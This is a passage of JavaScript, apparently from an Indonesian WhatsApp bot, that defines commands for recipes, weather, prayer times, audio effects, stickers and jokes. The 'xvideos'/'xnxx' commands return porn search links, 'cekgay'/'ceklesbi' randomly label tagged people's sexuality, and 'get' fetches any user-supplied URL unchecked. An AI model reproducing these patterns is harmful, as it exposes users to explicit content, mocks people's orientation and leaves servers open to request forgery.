const apiUrl = `https://api.tioo.eu.org/chord?query=${encodeURIComponent(text)}`;
const response = await fetchJson(apiUrl);
if (response && response.status && response.result) {
const chordData = response.result; 
let teks = `••••>>   *${text.toUpperCase()}*\n\n••••>>   *CHORD*   <<••••\n\n${chordData.chord}\n\n© *Sumber: ${response.creator}*`;
m.reply(teks);
} else {
m.reply("Chord tidak ditemukan");
}
} catch (error) {
console.error(error);
m.reply("Terjadi kesalahan.");
}
}
break

case 'kodepos': {
  if (!text) return m.reply('Mau kota mana?')
  try {
    let jr = await fetchJson(`https://itzpire.com/search/kodepos?query=${encodeURIComponent(text)}`)
    let jo = jr.data
    let txt = `Hasil searching ${kapital(text)}:\n\n`

    jo.forEach(item => {
      txt += `Kode Pos: ${item.code}\n`
      txt += `Desa/Kelurahan: ${item.village}\n`
      txt += `Kecamatan: ${item.district}\n`
      txt += `Kabupaten/Kota: ${item.regency}\n`
      txt += `Provinsi: ${item.province}\n`
      txt += `Koordinat: ${item.latitude}, ${item.longitude}\n`
      txt += `Elevasi: ${item.elevation} m\n`
      txt += `Zona Waktu: ${item.timezone}\n\n`
    })

    m.reply(txt)
  } catch (err) {
    console.error(err)
    m.reply('Ada kesalahan saat mengambil data')
  }
}
break

case 'xvideos':
case 'xvidsearch': {
  if (!text) return m.reply(`Contoh: ${command} pink pussy`)
  try {
    vreact()
    let searchResults = await fetchJson(`https://api.agatz.xyz/api/xvideo?message=${text}`)
    let videos = searchResults.data
    let teks = `*XVIDEO - SEARCH*\n\nHasil dari: ` + `${kapital(text)}` + `\n\n`
    for (let i of videos) {
      teks += `Judul: ${kapital(i.title)}\nDurasi: ${i.duration}\nLink: ${i.url}\n\n`
    }
    Line.sendMessage(m.chat, {
      image: {
        url: videos[0].thumb
      },
      caption: teks
    }, {
      quoted: m
    })
  } catch (err) {
    m.reply(`Terjadi kesalahan: ${err}`)
  }
}
break

case 'xnxxs':
case 'xnxxsearch': {
  if (!text) return m.reply(`Contoh: ${command} pink pussy`)
  try {
    vreact()
    let searchResults = await fetchJson(`https://api.agatz.xyz/api/xnxx?message=${text}`)
    let videos = searchResults.data.result
    let teks = `*XVIDEO - SEARCH*\n\nHasil dari: ` + `${kapital(text)}` + `\n\n`
    for (let i of videos) {
      teks += `Judul: ${kapital(i.title)}\nInfo: ${i.info}\nLink: ${i.link}\n\n`
    }
      await Line.sendMessage(m.chat, {text: teks }, {quoted: m })
  } catch (err) {
    m.reply(`Terjadi kesalahan: ${err}`)
  }
}
break

case 'recipe':
case 'resep': {
  if (!text) return m.reply(`Contoh: ${command} pizza`)

  const url = `https://api.tioo.eu.org/cariresep?query=${text}`
  const result = await fetchJson(url)

  if (!result.hasil || !result.hasil.data || result.hasil.data.length === 0) {
    return m.reply('Gagal mengambil data')
  }

  let message = `*LIST RESEP ${text.toUpperCase()}:*\n\n`
  result.hasil.data.forEach((item, index) => {
    message += `${index + 1}. *${item.judul}*\n${item.link}\n\n`
  })

  m.reply(message.trim())
}
break

case 'bacaresep':
case 'baca-resep': {
  if (!text) return m.reply(`Contoh: ${command} linknya`)

  const url = `https://api.tioo.eu.org/bacaresep?link=${encodeURIComponent(text)}`
  const result = await fetchJson(url)

  if (!result.hasil || !result.hasil.data) {
    return m.reply('Gagal mengambil data')
  }

  const { judul, waktu_masak, hasil, tingkat_kesulitan, thumb, bahan, langkah_langkah } = result.hasil.data

  let message = `🍽️ *••> ${judul.toUpperCase()}*\n\n`
  message += `*• Waktu Masak*: ${waktu_masak}\n`
  message += `*• Hasil:* ${hasil}\n`
  message += `*• Tingkat Kesulitan:* ${tingkat_kesulitan}\n\n`
  message += `*• Bahan:*\n${bahan}\n`
  message += `*• Langkah-Langkah:*\n${langkah_langkah}`

  Line.sendMessage(m.chat, { image: { url: thumb }, caption: message })
}
break

case 'weather':
case 'weatherinfo':
case 'cuaca':
case 'infocuaca': {
  if (!text) return m.reply(`Contoh: ${command} Jakarta`)

  const url = `https://api.tioo.eu.org/weather?text=${encodeURIComponent(text)}`
  const result = await fetchJson(url)

  if (!result.status || !result.result) {
    return m.reply('Gagal mengambil data')
  }

  const { location, country, weather, currentTemp, maxTemp, minTemp, humidity, windSpeed } = result.result

  let message = `🌤️ *••> INFO  CUACA*\n\n`
  message += `*• Lokasi:* ${location}, ${country}\n`
  message += `*• Cuaca:* ${weather}\n`
  message += `*• Suhu:* ${currentTemp}\n`
  message += `*• Max Suhu:* ${maxTemp}\n`
  message += `*• Min Suhu:* ${minTemp}\n`
  message += `*• Kelembapan:* ${humidity}\n`
  message += `*• Kecepatan Angin:* ${windSpeed}`

  m.reply(message)
}
break

case 'calender':
case 'kalender': {
  const [bulan, tahun] = text.split(' ')
  if (!bulan || !tahun) return m.reply('Masukkan bulan dan tahun dengan: <bulan> <tahun>')
  if (isNaN(bulan) || bulan < 1 || bulan > 12) {
    return m.reply(`Bulan harus berupa angka antara 1-12.\nContoh: ${command} 5 2024 untuk Maret 2024`)
  }

  const url = `https://api.tioo.eu.org/kalender?bulan=${bulan}&tahun=${tahun}`
  const result = await fetchJson(url)

  if (!result.status || !result.result || result.result.length === 0) {
    return m.reply('Tidak ada data apapun')
  }

  let message = `*KALENDER BULAN INI*\n\n`
  result.result.forEach(holiday => {
    message += `*• Tanggal:* ${holiday.holiday_date}\n`
    message += `*• Nama:* ${holiday.holiday_name}\n`
    message += `*• Libur Nasional:* ${holiday.is_national_holiday ? 'Ya' : 'Tidak'}\n\n`
  })

  m.reply(message)
}
break

case 'gempa':
case 'infogempa': {
  const url = `https://api.tioo.eu.org/gempa`
  const result = await fetchJson(url)

  if (!result || result.status !== 200 || !result.result) {
    return m.reply('Gagal mengambil data')
  }

  const { tanggal, jam, lintang, bujur, magnitude, kedalaman, potensi, wilayah, image } = result.result

  let message = `🌍 *••> INFO  GEMPA*\n\n`
  message += `*• Tanggal:* ${tanggal}\n`
  message += `*• Lokasi:* ${wilayah}\n`
  message += `*• Lintang:* ${lintang}\n*• Bujur:* ${bujur}\n`
  message += `*• Magnitude: ${magnitude}\n`
  message += `*• Kedalaman:* ${kedalaman}\n`
  message += `*• Potensi:* ${potensi}`

  await Line.sendMessage(m.chat, { image: { url: image }, caption: message })
}
break

case 'ppcp':
case 'couple':
case 'ppcouple': {
  const url = `https://api.tioo.eu.org/ppcp`
  const result = await fetchJson(url)

  if (!result || !result.status) {
    return m.reply('Gagal mengambil data')
  }

  const { male, female } = result

  await Line.sendMessage(m.chat, { image: { url: male }, caption: '👨 PP Couple Cowok' })
  await Line.sendMessage(m.chat, { image: { url: female }, caption: '👩 PP Couple Cewek' })
}
break

case 'jarak': {
  if (!text.includes('|')) return m.reply(`Contoh: ${command} Bekasi|Jakarta\nNote: dari|ke`)
  let [lc1, lc2] = text.split('|')
  if (!lc1 || !lc2) return m.reply(`Contoh: ${command} Bekasi|Jakarta\nNote: dari|ke`)
  try {
    let res = await fetchJson(`https://api.tioo.eu.org/jarak?dari=${encodeURIComponent(lc1)}&ke=${encodeURIComponent(lc2)}`)
    let ror = res.url
    await Line.sendMessage(m.chat, {image: {url: ror.data }, caption: ror.desc }, {quoted: m})
  } catch (err) {
    console.error(err)
    m.reply('Terjadi kesalahan')
  }
}
break

case 'jadwaltv': {
    try {
        if (!text) return m.reply(`Contoh: ${command} indosiar`)

        const res = await fetchJson(`https://api.tioo.eu.org/jadwaltv?tv=${encodeURIComponent(text.toLowerCase())}`)
        if (res.tv_available) {
            if (!res.result) return m.reply('Jadwal tidak ditemukan untuk channel tersebut.')
            let jadwal = `Jadwal TV ${text.charAt(0).toUpperCase() + text.slice(1)}:\n`
            res.result.result.forEach(item => {
                jadwal += `\n🔹 ${item.date} - ${item.event}\n`
                jadwal += `────────────────────────\n`
            })
            m.reply(jadwal)
        } else {
            m.reply(res.tv_available)
        }
    } catch (err) {
        m.reply('Terjadi kesalahan: ' + err)
    }
}
break

case 'get': {
	if (!text.includes('http')) return reply(`Contoh: ${command} linknya`)
	
	try {
		const data = await axios.get(text)
		const contentType = data.headers["content-type"]

		if (contentType.startsWith('image/')) {
			Line.sendMessage(m.chat, {
				image: { url: text },
				caption: `${text}\n\n*Headers Respons:*\n${Object.entries(data.headers).map(([key, value]) => `*${key}:* ${value}`).join('\n')}`
			}, { quoted: m })

		} else if (contentType.startsWith('video/')) {
			Line.sendMessage(m.chat, {
				video: { url: text },
				caption: `${text}\n\n*Headers Respons:*\n${Object.entries(data.headers).map(([key, value]) => `*${key}:* ${value}`).join('\n')}`
			}, { quoted: m })

		} else if (contentType.startsWith('audio/')) {
			Line.sendMessage(m.chat, {
				audio: { url: text },
				mimetype: 'audio/mpeg'
			}, { quoted: m })

		} else {
			m.reply(util.format(data.data))

			const saveFileToDisk = async (url, outputPath) => {
				const response = await axios.get(url, { responseType: 'arraybuffer' })
				const contentType = response.headers['content-type']
				const ext = contentType.split('/')[1] || 'bin'
				const filePath = `${outputPath}.${ext}`

				return new Promise((resolve, reject) => {
					fs.writeFile(filePath, response.data, (err) => {
						if (err) reject(err)
						else resolve({ file: filePath, ext, mime: contentType })
					})
				})
			}

			try {
				const buffer = await Line.downloadAndSaveMediaMessage(m.quoted || m)
				await sleep(2000)

				const mimeType = await getMimeType(buffer)
				Line.sendMessage(m.chat, {
					document: fs.readFileSync(buffer),
					mimetype: mimeType,
					fileName: `get-data.${mimeType}`
				}, { quoted: m })

				fs.unlinkSync(buffer)
			} catch (error) {
				console.error('Gagal menyimpan:', error)
			}
		}
	} catch (error) {
		m.reply(error)
		console.error('Error:', error)
	}
}
break

case 'ocr': {
  if (!/image/.test(mime)) return m.reply('Harus berupa gambar!')
  let media = await Line.downloadAndSaveMediaMessage(quoted)
  vreact()

  try {
    let url = await uploadMedia(media)
    let jr = await fetchJson(`https://itzpire.com/tools/ocr?url=${encodeURIComponent(url)}`)
    let jw = jr.data
    m.reply(`*Overlay:* ${jw.TextOverlay.HasOverlay ? 'Yes' : 'No'}\n*Message:* ${jw.Message ? jw.Message : 'Nothing'}\n*Hasil OCR:* ${jw.ParsedText}`)
  } catch (err) {
      console.error(err)
      m.reply(err)
  }

  await fs.unlinkSync(media)
}
break

case 'whatmusic': {
  if (!/audio/.test(mime) && !/ogg/.test(mime)) return m.reply('Harus berupa gambar!')
  let media = await Line.downloadAndSaveMediaMessage(quoted)
  vreact()

  try {
    let url = await CatBox(media)
    let jr = await fetchJson(`https://api.tioo.eu.org/whatmusic?url=${Enc(url)}`)
    m.reply(jr.result)
  } catch (err) {
      console.error(err)
      m.reply(err)
  }

  await fs.unlinkSync(media)
}
break

case 'stcrandom': {
    try {
        if (!text) return m.reply(`Contoh: ${p_c} dino`)
        const res1 = await fetchJson(`https://api.agatz.xyz/api/sticker?message=${text}`)
        const sticker1Url = res1.data.sticker_url[Math.floor(Math.random() * res1.data.sticker_url.length)]
        const buffer = await fetch(sticker1Url).then(res => res.buffer())
        await Line.sendImageAsSticker(m.chat, buffer, m, { packname: '', author: author + ` | ${db.data.users[m.sender].nama}` })
    } catch (err) {
        try {
            const res2 = await fetchJson(`https://itzpire.com/search/sticker?query=${text}`)
            const sticker2Url = res2.data.sticker_url[Math.floor(Math.random() * res2.data.sticker_url.length)]
            const buffer = await fetch(sticker2Url).then(res => res.buffer())
            await Line.sendImageAsSticker(m.chat, buffer, m, { packname: '', author: author + ` | ${db.data.users[m.sender].nama}` })
        } catch (err) {
            m.reply('Terjadi kesalahan: ' + err)
        }
    }
}
break

case 'jarak': {
if (!text || !text.includes('|')) {
return m.reply(`Contoh: ${prefix + command} Jakarta|Surabaya`);
}
const [dari, ke] = text.split('|').map(loc => loc.trim());
try {
const apiUrl = `https://api.tioo.eu.org/jarak?dari=${encodeURIComponent(dari)}&ke=${encodeURIComponent(ke)}`;
const response = await fetchJson(apiUrl);
if (response && response.status && response.url && response.url.status) {
const { data: imgLink, desc: deskripsi } = response.url;
let teks = `*JARAK ANTAR KOTA*\n\n${deskripsi}\n\nSumber: ${response.creator}`;
await Line.sendMessage(m.chat, { image: { url: imgLink }, caption: teks }, { quoted: m });
} else {
m.reply("Tidak ada data jarak yang ditemukan.");
}
} catch (error) {
console.error(error);
m.reply("Terjadi kesalahan");
}
}
break

case 'cuaca': {
if (!text) {
return m.reply(`Contoh: ${prefix + command} Jakarta`);
}
try {
const apiUrl = `https://api.tioo.eu.org/weather?text=${encodeURIComponent(text)}`;
const response = await fetchJson(apiUrl);
if (response && response.status && response.result) {
const {
location,
country,
weather,
currentTemp,
maxTemp,
minTemp,
humidity,
windSpeed
} = response.result;
let teks = `*INFO CUACA*\n\n`
+ `🌆 *Lokasi:* ${location}, ${country}\n`
+ `🌤️ *Cuaca:* ${weather}\n`
+ `🌡️ *Suhu Saat Ini:* ${currentTemp}\n`
+ `🌡️ *Suhu Maksimum:* ${maxTemp}\n`
+ `🌡️ *Suhu Minimum:* ${minTemp}\n`
+ `💧 *Kelembapan:* ${humidity}\n`
+ `💨 *Kecepatan Angin:* ${windSpeed}\n\n`
+ `Sumber: aemt.uk.to`;
await Line.sendMessage(m.chat, { text: teks }, { quoted: m });
} else {
m.reply("Tidak ada informasi cuaca yang ditemukan.");
}
} catch (error) {
console.error(error);
m.reply("Terjadi kesalahan.");
}
}
break

case 'cariresep': {
if (!text) {
return m.reply(`Contoh: ${prefix + command} Kentang`);
}
try {
const apiUrl = `https://api.tioo.eu.org/cariresep?query=${encodeURIComponent(text)}`;
const response = await fetchJson(apiUrl);
if (response && response.hasil && response.hasil.data && response.hasil.data.length > 0) {
const maxResults = 5;
const recipes = response.hasil.data.slice(0, maxResults);
let teks = `🔍 *Hasil Pencarian Resep untuk:* _${text}_\n\n`;
recipes.forEach((recipe, index) => {
teks += `*${index + 1}. ${recipe.judul}*\n🔗 ${recipe.link}\n\n`;
});
teks += `Sumber: aemt.uk.to`;         
await Line.sendMessage(m.chat, { text: teks }, { quoted: m });
} else {
m.reply("Tidak ada informasi resep yang ditemukan.");
}
} catch (error) {
console.error(error);
m.reply("Terjadi kesalahan.");
}
}
break

case 'expireddomain': {
if (!text) {
return m.reply(`Contoh: ${prefix + command} google.com`);
}
try {
const apiUrl = `https://api.tioo.eu.org/expireddomain?domain=${encodeURIComponent(text)}`;
const response = await fetchJson(apiUrl);
if (response && response.status && response.data) {
const domainInfo = response.data;
let teks = `🔍 *Status Domain*\n`;
teks += `🌐 *Domain:* ${domainInfo.domain}\n`;
teks += `📅 *Tanggal Pembuatan:* ${domainInfo.creationDate}\n`;
teks += `🔄 *Tanggal Pembaruan:* ${domainInfo.updatedDate}\n`;
teks += `📆 *Tanggal Kedaluwarsa:* ${domainInfo.expirationDate}\n`;
teks += `🟢 *Ketersediaan:* ${domainInfo.isAvailable ? 'Tersedia' : 'Tidak Tersedia'}\n\n`;
teks += `Sumber: ${response.creator}`;
await Line.sendMessage(m.chat, { text: teks }, { quoted: m });
} else {
m.reply("Tidak ada informasi status domain tersebut.");
}
} catch (error) {
console.error(error);
m.reply("Terjadi kesalahan.");
}
}
break

case "ambilq": case "q": {
if (!m.quoted) return
let jsonData = JSON.stringify(m.quoted, null, 2)
m.reply(jsonData)
} 
break

case 'steam': {
   try {
       if (!text) return m.reply(`Contoh: ${p_c} stickman`)
       let results = await fetchJson(`https://deliriussapi-oficial.vercel.app/search/steam?query=${text}`)

       if (!Array.isArray(results) || results.length === 0) {
           return m.reply('Tidak ada hasil ditemukan.')
       }

       let allResults = results.data.map(kep => {
           return `Judul: ${kep.title}\nVersi: ${kep.version}\nSize: ${kep.size}\nLink: ${kep.link}\nMod: ${kep.mod}\n`
       }).join('\n')

       let firstImageUrl = results.data[0].image;
       Line.sendMessage(m.chat, {image: {url: firstImageUrl}, caption: allResults}, {quoted: m})
   } catch (err) {
       m.reply('Terjadi kesalahan: ' + err)
       console.error('Error:', err)
   }
}
break

// === Voice Menu

case 'bass':
case 'blown':
case 'deep':
case 'earrape':
case 'fast':
case 'fat':
case 'nightcore':
case 'reverse':
case 'robot':
case 'slow':
case 'smooth':
case 'tupai':
case 'echo':
case 'flanger':
case 'vaporwave':
case 'treble':
case 'vibrato':
case 'distortion':
case 'karaoke':
case 'chipmunk': {
    try {
        let set
        if (command === 'bass') set = "-af equalizer=f=54:width_type=o:width=2:g=20"
        if (command === 'blown') set = "-af acrusher=.1:1:64:0:log"
        if (command === 'deep') set = "-af atempo=4/4,asetrate=44500*2/3"
        if (command === 'earrape') set = "-af volume=12"
        if (command === 'fast') set = '-filter:a "atempo=1.63,asetrate=44100"'
        if (command === 'fat') set = '-filter:a "atempo=1.6,asetrate=22100"'
        if (command === 'nightcore') set = "-filter:a atempo=1.06,asetrate=44100*1.25"
        if (command === 'reverse') set = '-filter_complex "areverse"'
        if (command === 'robot') set = "-filter_complex \"afftfilt=real='hypot(re,im)*sin(0)':imag='hypot(re,im)*cos(0)':win_size=512:overlap=0.75\""
        if (command === 'slow') set = '-filter:a "atempo=0.7,asetrate=44100"'
        if (command === 'smooth') set = "-filter:v \"minterpolate='mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120'\""
        if (command === 'tupai') set = '-filter:a "atempo=0.5,asetrate=65100"'
        if (command === 'echo') set = '-af "aecho=0.8:0.88:60:0.4"'
        if (command === 'flanger') set = '-af "flanger"'
        if (command === 'vaporwave') set = "-filter:a atempo=0.8,asetrate=44100*0.9"
        if (command === 'treble') set = "-af treble=g=5"
        if (command === 'vibrato') set = "-af vibrato=f=5"
        if (command === 'distortion') set = "-af adistort"
        if (command === 'karaoke') set = "-af stereotools=mlev=0.03"
        if (command === 'chipmunk') set = '-filter:a "asetrate=22100,atempo=1.5"'
        
        if (quoted && quoted.mimetype && quoted.mimetype.startsWith('audio')) {
            vreact
            let media = await Line.downloadAndSaveMediaMessage(quoted)
            let ran = getRandom(".mp3")
            exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
                fs.unlinkSync(media)
                if (err) return m.reply(err.toString())
                let buff = fs.readFileSync(ran)
                Line.sendMessage(m.chat, {audio: buff, mimetype: "audio/mpeg" }, {quoted: m })
                fs.unlinkSync(ran)
            })
        } else {
            m.reply(`Kutip audionya!`)
        }
    } catch (err) {
        m.reply(err.toString())
    }
}
break

case 'brat': {
  if (!text) return m.reply(`Contoh: .brat hai`)
  if (text.length > 250) return m.reply(`Karakter terbatas, max 250!`)
  vreact()
  let res = await fetch(`https://api.siputzx.my.id/api/m/brat?text=${text}`)
  let buffer = await res.buffer()
  await Line.sendImageAsSticker(m.chat, buffer, m, {
      packname: ``,
      author: `${author}`
    })
}
break

// === Islamic Menu
case 'jadwalsholat': {
  if (!text) return m.reply('Mau kota mana?')
    try {
        let jir = await fetchJson(`https://api.agatz.xyz/api/jadwalsholat?kota=${encodeURIComponent(text)}`)
        let ye = jir.data
        let tks = `\n*JADWAL SHOLAT ${text.toUpperCase()}*
        Shubuh: ${ye.subuh}
        Dzuhur: ${ye.dhuhur}
        Ashar: ${ye.ashar}
        Maghrib: ${ye.maghrib}
        Isya: ${ye.isya}\n`
        m.reply(tks)
    } catch (err) {
        console.error(err)
        m.reply(err)
    }
}
break

case 'asmaulhusna': {
  try {
    let jir = await fetchJson('https://islamic-api-zhirrr.vercel.app/api/asmaulhusna')
    let ye = jir.data

    let tks = '*ASMAUL HUSNA*\n\n' + ye.map((item) => {
      return `Urutan: ${item.index}\nLatin: ${item.latin}\nArab: ${item.arabic}\nTerjemahan ID: ${item.translation_id}\nTerjemahan EN: ${item.translation_en}\n`
    }).join('\n')

    m.reply(tks)
  } catch (err) {
    console.error(err)
    m.reply('Error cuy, coba lagi ntar!')
  }
}
break

case 'niatsholat': {
  try {
    let jir = await fetchJson('https://islamic-api-zhirrr.vercel.app/api/niatshalat')
    let niatSholat = jir

    if (!text) {
      let daftarNiat = '*DAFTAR NIAT SHOLAT*\n\n' + niatSholat.map((item) => `- ${item.name}`).join('\n')
      daftarNiat += '\n\nKetik *.niatsholat [nama sholat]* untuk melihat niat, contoh: *.niatsholat subuh*'
      m.reply(daftarNiat)
    } else {
      let hasil = niatSholat.find((item) => item.name.toLowerCase().includes(text.toLowerCase()))
      
      if (hasil) {
        let tks = `*${hasil.name.toUpperCase()}*\n\n` +
                  `Arab: ${hasil.arabic}\n` +
                  `Latin: ${hasil.latin}\n` +
                  `Terjemahan: ${hasil.terjemahan}`
        m.reply(tks)
      } else {
        m.reply('Niat sholat yang lu cari ga ketemu cuy. Cek lagi nama sholatnya!')
      }
    }
  } catch (err) {
    console.error(err)
    m.reply('Error cuy, coba lagi ntar!')
  }
}
break

case 'surah': {
  try {
    let surahData = await fetchJson('https://api.alquran.cloud/v1/surah')
    let surahList = surahData.data
    let surahNames = surahList.map(item => item.englishName)

    const mean = didyoumean(text, surahNames)
    const sim = similarity(text, mean)
    const similarityPercentage = parseInt(sim * 100)

    if (!text) {
      let daftarSurah = '*DAFTAR SURAH*\n\n' + surahList.map((item) => `- ${item.englishName}`).join('\n')
      daftarSurah += '\n\nKetik *.surah [nama surah]* untuk melihat detail surah, contoh: *.surah al-fatiha*'
      m.reply(daftarSurah)
    } else if (mean && text.toLowerCase() !== mean.toLowerCase()) {
      let response = `Maaf, nama surah yang kamu cari ga ketemu. Mungkin yang kamu maksud:\n\n•> ${prefix + mean}\n•> Kemiripan: ${similarityPercentage}%`
      m.reply(response)
    } else {
      let foundSurah = surahList.find((item) => item.englishName.toLowerCase() === text.toLowerCase())

      if (foundSurah) {
        let detailSurah = `*${foundSurah.englishName.toUpperCase()}*\n\n` +`Nama Arab: ${foundSurah.name}\n` +`Jumlah Ayat: ${foundSurah.numberOfAyahs}\n` +`Tempat Diturunkan: ${foundSurah.revelationType}`
        m.reply(detailSurah)
      } else {
        m.reply('Surah yang kamu cari ga ketemu. Cek lagi nama surahnya!')
      }
    }
  } catch (err) {
    console.error(err)
    m.reply('Error cuy, coba lagi ntar!')
  }
}
break

case 'doa':
case 'berdoa': {
  try {
    let jir = await fetchJson('https://doa-doa-api-ahmadramadhan.fly.dev/api')
    let daftarDoa = jir

    if (!text) {
      let listDoa = '*DAFTAR DOA*\n\n' + daftarDoa.map((item) => `- ${item.doa}`).join('\n')
      listDoa += '\n\nKetik *.doa [nama doa]* untuk melihat doa, contoh: *.doa doa sebelum tidur*'
      m.reply(listDoa)
    } else {
      let hasil = daftarDoa.find((item) => item.doa.toLowerCase().includes(text.toLowerCase()))
      
      if (hasil) {
        let tks = `*${hasil.doa.toUpperCase()}*\n\n` +
                  `Ayat: ${hasil.ayat}\n` +
                  `Latin: ${hasil.latin}\n` +
                  `Artinya: ${hasil.artinya}`
        m.reply(tks)
      } else {
        m.reply('Doa yang lu cari ga ketemu cuy. Cek lagi nama doanya!')
      }
    }
  } catch (err) {
    console.error(err)
    m.reply('Error cuy, coba lagi ntar!')
  }
}
break

case 'gislam': {
  if (!text) return m.reply('Mau cari tentang apa?')
  async function islam(query) {
      try {
          const response = await fetchJson(`https://artikel-islam.netlify.app/.netlify/functions/api/ms?page=1&s=${encodeURIComponent(query)}`)
          if (response.success) {
              const articles = response.data.data
              let message = `Total artikel: ${articles.length}\n\n`
              articles.forEach((article, index) => {
                  message += `${index + 1}. Judul: ${article.title}\nURL: ${article.url}\n\n`
              })
              return message
          } else {
              return 'Gagal mengambil data'
          }
      } catch (error) {
          return 'Terjadi kesalahan saat mengambil data'
      }
  }
              let lp = await islam(text)
              m.reply(lp)
}
break

case 'kataislam': {
  async function AI(content) {
      try {
          const response = await axios.post('https://luminai.my.id/', { content, cName: "S-AI", cID: "S-AIbAQ0HcC" });

          return response.data
      } catch (error) {
          console.error(error)
          throw error
      }
  }
      let qe = 'Berikan satu kata-kata atau quotes Islamic random yang sangat memotivasi, dan menginspirasi, jawab langsung ke intinya!'
      let qo = await AI(qe)
      m.reply(qo.result)
}
break

case 'pantunislam': {
  async function AI(content) {
      try {
          const response = await axios.post('https://luminai.my.id/', { content, cName: "S-AI", cID: "S-AIbAQ0HcC" });

          return response.data
      } catch (error) {
          console.error(error)
          throw error
      }
  }
      let qe = 'Berikan satu kata-kata pantun Islamic random yang sangat memotivasi, dan menginspirasi, jawab langsung ke intinya!'
      let qo = await AI(qe)
      m.reply(qo.result)
}
break
// === Fun Menu

case 'apakah': {
    if (!text) return m.reply(`Contoh: ${p_c} saya ganteng?`)
    const jawaban = ['Iya', 'Mungkin iya', 'Mungkin', 'Gak', 'Mungkin gak', 'Gak tau']
    const coli = jawaban[Math.floor(Math.random() * jawaban.length)]
    m.reply(`*Pertanyaan:* Apakah ${text}\n*Jawaban:* ${coli}`)
}
break

case 'bisakah': {
    if (!text) return m.reply(`Contoh: ${p_c} saya jadi kaya?`)
    const jawaban = ['Bisa banget', 'Bisa', 'Mungkin bisa', 'Mungkin', 'Gak bisa', 'Mungkin gak bisa', 'Gak bisa lah', 'Gak tau']
    const coli = jawaban[Math.floor(Math.random() * jawaban.length)]
    m.reply(`*Pertanyaan:* Bisakah ${text}\n*Jawaban:* ${coli}`)
}
break

case 'kapankah': {
    if (!text) return m.reply(`Contoh: ${p_c} saya kaya?`)
    const jawabanWaktu = [
        'Bentar lagi',
        'Nunggu kiamat dulu',
        'Kapan-kapan',
        'Besok',
        'Pas lu tidur',
        'Gw juga gak tau kapan'
    ]
    const waktuRandom = Math.floor(Math.random() * 10) + 1
    const unitWaktu = ['minggu', 'bulan', 'tahun']
    const unitWaktuRandom = unitWaktu[Math.floor(Math.random() * unitWaktu.length)]
    const jawaban = [...jawabanWaktu, `${waktuRandom} ${unitWaktuRandom} lagi`]
    const hasilJawaban = jawaban[Math.floor(Math.random() * jawaban.length)]
    m.reply(`*Pertanyaan:* Kapankah ${text}\n*Jawaban:* ${hasilJawaban}`)
}
break

case 'cekganteng': {
    if (!text) return m.reply(`Contoh: ${p_c} nama seseorang atau tag`)
    const jawaban1 = ['ganteng', 'jelek']
    const coli1 = jawaban1[Math.floor(Math.random() * jawaban1.length)]
    
    const jawaban = [randomNomor(2, 100) + `% ${coli1}`, 'Ganteng', 'Ganteng amat', 'Lumayan', 'Jelek', 'Jelek amat']
    const coli = jawaban[Math.floor(Math.random() * jawaban.length)]
    m.reply(`*Pertanyaan:* Cekganteng ${text}\n*Jawaban:* ${coli}`)
}
break

case 'cekcantik': {
    if (!text) return m.reply(`Contoh: ${p_c} nama seseorang atau tag`)
    const jawaban1 = ['cantik', 'jelek']
    const coli1 = jawaban1[Math.floor(Math.random() * jawaban1.length)]
    
    const jawaban = [randomNomor(2, 100) + `% ${coli1}`, 'Cantik', 'Cantik amat', 'Lumayan', 'Jelek', 'Jelek amat']
    const coli = jawaban[Math.floor(Math.random() * jawaban.length)]
    m.reply(`*Pertanyaan:* Cekcantik ${text}\n*Jawaban:* ${coli}`)
}
break

case 'cekgay': {
    if (!text) return m.reply(`Contoh: ${p_c} nama seseorang atau tag`)
    const jawaban1 = ['gay', 'raja gay']
    const coli1 = jawaban1[Math.floor(Math.random() * jawaban1.length)]
    
    const jawaban = [randomNomor(2, 100) + `% ${coli1}`, 'Gay', 'Gay amat', 'Mayan', 'Gak', 'Gak lah']
    const coli = jawaban[Math.floor(Math.random() * jawaban.length)]
    m.reply(`*Pertanyaan:* Cekgay ${text}\n*Jawaban:* ${coli}`)
}
break

case 'ceklesbi': {
    if (!text) return m.reply(`Contoh: ${p_c} nama seseorang atau tag`)
    const jawaban1 = ['lesbi', 'ratu lesbi']
    const coli1 = jawaban1[Math.floor(Math.random() * jawaban1.length)]
    
    const jawaban = [randomNomor(2, 100) + `% ${coli1}`, 'Lesbi', 'Lesbi amat', 'Mayan', 'Gak', 'Gak lah']
    const coli = jawaban[Math.floor(Math.random() * jawaban.length)]
    m.reply(`*Pertanyaan:* Ceklesbi ${text}\n*Jawaban:* ${coli}`)
}
break

case 'sifat':
case 'ceksifat': {
    if (!text) return m.reply(`Contoh: ${p_c} nama seseorang atau tag`)
    const sifat = [
        'Periang', 'Pemalu', 'Pendiam', 'Perhatian', 'Sabar', 'Cepat marah', 
        'Ceroboh', 'Pekerja keras', 'Ambisius', 'Bijaksana', 'Manja', 'Kreatif', 
        'Penyayang', 'Suka membantu', 'Pendendam', 'Penuh semangat', 'Romantis', 
        'Cepat bosan', 'Penuh rencana', 'Suka menunda', 'Penuh rahasia', 
        'Cuek', 'Penuh percaya diri', 'Pemikir', 'Suka bercanda', 'Jujur', 
        'Penyendiri', 'Penuh kejutan', 'Pemalu tapi hangat', 'Bergairah', 
        'Suka berdiskusi', 'Tegas', 'Suka menyendiri', 'Ramah', 'Misterius', 
        'Perasa', 'Bijak', 'Tertutup', 'Suka tantangan', 'Optimis', 'Pencemas', 
        'Suka menjadi pusat perhatian', 'Setia', 'Suka berpetualang', 'Gugup', 
        'Sensitif', 'Suka ngatur', 'Tangguh', 'Serius', 'Mudah marah', 
        'Pandai berdamai', 'Terlalu perfeksionis', 'Sederhana', 'Penuh kasih sayang', 
        'Penuh energi', 'Introvert', 'Extrovert', 'Ambivert', 'Kocak', 'Logis', 
        'Penyendiri tapi bisa bersosialisasi', 'Penuh ide', 'Sangat disiplin', 
        'Berani mengambil risiko', 'Suka mengalah', 'Senang bergaul', 'Suka berolahraga', 
        'Mudah terpengaruh', 'Bergantung pada orang lain', 'Penuh semangat hidup', 
        'Terlalu banyak bicara', 'Sangat memperhatikan detail', 'Suka memberi nasihat'
    ]
    const coli = sifat[Math.floor(Math.random() * sifat.length)]
    m.reply(`*Pertanyaan:* Ceksifat ${text}\n*Jawaban:* ${coli}`)
}
break

case 'cekhobi':
case 'cekhoby':
case 'cekhobby': {
    if (!text) return m.reply(`Contoh: ${p_c} nama seseorang atau tag`)
    const hobi = [
        'Membaca buku', 'Berenang', 'Olahraga', 'Memasak', 'Menulis', 'Bermain game', 
